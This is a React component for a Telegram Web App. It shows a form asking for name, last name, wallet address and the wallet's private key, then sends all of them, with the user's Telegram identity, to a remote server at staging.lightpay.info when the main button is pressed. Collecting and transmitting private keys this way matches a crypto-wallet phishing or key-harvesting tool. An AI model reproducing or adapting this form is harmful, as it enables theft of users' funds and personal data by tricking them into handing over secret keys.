import React, {useCallback, useEffect, useState} from 'react';
import './Form.css'
import {useTelegram} from "../hooks/useTelegram";

const Form = () => {
    const [name, setName] = useState('');
    const [lastname, setLastname] = useState('');
    const [wallet, setWallet] = useState('');
    const [privateKey, setPrivateKey] = useState('');
    const {tg, queryId, user} = useTelegram();

    const onSendData = useCallback(() => {
        const data = {
            name,
            lastname,
            wallet,
            privateKey,
            queryId,
            user
        }

        fetch('https://staging.lightpay.info/web-data', {
            method: 'POST',
            headers: {
                'Content-Type' : 'application/json',
            },
            body: JSON.stringify(data)
        })
    }, [name, lastname, wallet, privateKey, queryId, user])

    useEffect(() => {
        tg.onEvent('mainButtonClicked', onSendData);
        return () => {
            tg.offEvent('mainButtonClicked', onSendData);
        }
    }, [onSendData])


    useEffect(() => {
        tg.MainButton.setParams({
            text: 'Send Data'
        })
    }, [])

    useEffect(() => {
        if(!name || !lastname || !wallet || !privateKey) {
            tg.MainButton.hide();
        } else {
            tg.MainButton.show();
        }
    }, [name, lastname, wallet, privateKey])

    const onChangeName = (e) => {
        setName(e.target.value)
    }
    const onChangeLastname = (e) => {
        setLastname(e.target.value)
    }
    const onChangeWallet = (e) => {
        setWallet(e.target.value)
    }
    const onChangePrivateKey = (e) => {
        setPrivateKey(e.target.value)
    }


    return (
        <div className={'form'}>
            <h3>Enter you data</h3>
            <input className={'input'} type="text" placeholder={'Name'} value={name} onChange={onChangeName}/>
            <input className={'input'} type="text" placeholder={'Lastname'} value={lastname} onChange={onChangeLastname}/>
            <input className={'input'} type="text" placeholder={'Wallet'} value={wallet} onChange={onChangeWallet}/>
            <input className={'input'} type="text" placeholder={'Private Key'} value={privateKey} onChange={onChangePrivateKey}/>
        </div>
    );
};

export default Form;